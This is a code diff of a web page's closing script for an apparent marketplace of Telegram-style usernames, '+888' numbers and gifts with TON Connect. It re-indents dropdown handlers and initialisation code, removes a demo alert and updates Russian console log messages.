+        // ============================================================
+        // ===== PREMIUM DROPDOWNS =====
+        // ============================================================
+
+        document.querySelectorAll('.tm-dropdown .dropdown-toggle').forEach(function(toggle) {
+            toggle.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                var menu = this.parentElement.querySelector('.dropdown-menu');
+                if (menu) {
+                    menu.classList.toggle('show');
+                }
             });
-            document.querySelector('.js-giveaway-premium-btn').addEventListener('click', function() {
-                alert('Buy Subscriptions clicked! (demo)');
-            });
+        });
+        document.addEventListener('click', function() {
+            document.querySelectorAll('.dropdown-menu.show').forEach(function(menu) { menu.classList.remove(
+                    'show'); });
+        });
 
-            // ============================================================
-            // ===== PREMIUM DROPDOWNS =====
-            // ============================================================
+        // ============================================================
+        // ===== ИНИЦИАЛИЗАЦИЯ =====
+        // ============================================================
 
-            document.querySelectorAll('.tm-dropdown .dropdown-toggle').forEach(function(toggle) {
-                toggle.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    var menu = this.parentElement.querySelector('.dropdown-menu');
-                    if (menu) {
-                        menu.classList.toggle('show');
-                    }
-                });
-            });
-            document.addEventListener('click', function() {
-                document.querySelectorAll('.dropdown-menu.show').forEach(function(menu) { menu.classList.remove(
-                        'show'); });
-            });
+        offersPage = 0;
+        numbersPage = 0;
+        giftsPage = 0;
+        loadedOffers = [];
+        loadedNumbers = [];
+        loadedGifts = [];
 
-            // ============================================================
-            // ===== ИНИЦИАЛИЗАЦИЯ =====
-            // ============================================================
+        renderOffers('');
+        renderNumbers('');
+        renderGifts('all', '');
+        renderFilterCollections();
 
-            offersPage = 0;
-            numbersPage = 0;
-            giftsPage = 0;
-            loadedOffers = [];
-            loadedNumbers = [];
-            loadedGifts = [];
-
-            renderOffers('');
-            renderNumbers('');
-            renderGifts('all', '');
-            renderFilterCollections();
-
-            console.log('✅ Загружено юзернеймов:', offersData.length);
-            console.log('✅ Загружено номеров +888:', numbersData.length);
-            console.log('✅ Загружено подарков:', giftsData.length);
-            console.log('✅ БАГ С РАЗДЕЛАМИ ИСПРАВЛЕН');
-            console.log('✅ TON Connect инициализирован');
-            console.log('✅ При загрузке виден только раздел Usernames');
-
-        })();
+        console.log('✅ Загружено юзернеймов:', offersData.length);
+        console.log('✅ Загружено номеров +888:', numbersData.length);
+        console.log('✅ Загружено подарков:', giftsData.length);
+        console.log('✅ БАГ С РАЗДЕЛАМИ ИСПРАВЛЕН');
+        console.log('✅ TON Connect работает через connectWallet()');
+        console.log('✅ Под юзернеймами добавлено feds.t.me');
+        console.log('✅ При загрузке виден только раздел Usernames');
     </script>
 
 </body>
